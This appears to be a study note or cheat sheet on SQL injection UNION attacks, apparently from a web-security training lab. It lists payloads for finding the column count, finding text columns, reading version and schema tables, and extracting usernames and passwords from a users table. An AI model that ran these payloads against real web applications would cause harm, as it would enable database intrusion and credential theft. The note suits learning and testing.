# Union Attacks

## 1. Determining the number of columns

`' ORDER BY 1--`

`' ORDER BY 2--`

...
 When the specified column index exceeds the number of actual columns in the result set, the database returns an error.

`' UNION SELECT NULL--`

`' UNION SELECT NULL,NULL--`

...
When the number of nulls matches the number of columns, the database returns an additional row in the result set, containing null values in each column.

ORACLE: Every SELECT query must use the FROM keyword and specify a valid table. There is a built-in table on Oracle called dual).

`' UNION SELECT NULL FROM DUAL--`
 
## 2. Finding columns with a useful data type
 
`' UNION SELECT 'a',NULL,NULL,NULL--`

`' UNION SELECT NULL,'a',NULL,NULL--`

`' UNION SELECT NULL,NULL,'a',NULL--`

## 3. Examining the database in SQL injection attacks

Microsoft, MySQL	`SELECT @@version`
Oracle	`SELECT * FROM v$version`
Postgre `SQL	SELECT version()`

`' UNION SELECT @@version--`

Most database types (except Oracle)

`SELECT * FROM information_schema.tables`

`SELECT * FROM information_schema.columns WHERE table_name = 'Users'`

## 4. Using a SQL injection UNION attack to retrieve interesting data

`' UNION SELECT username, password FROM users--`

Retrieving multiple values within a single column

Oracle

`' UNION SELECT username || '~' || password FROM users--`

For others refer to cheat sheet

## Example:
`' UNION SELECT table_name, NULL FROM information_schema.tables--`

`' UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name='users_abcdef'--`

`' UNION SELECT username_abcdef, password_abcdef FROM users_abcdef--`
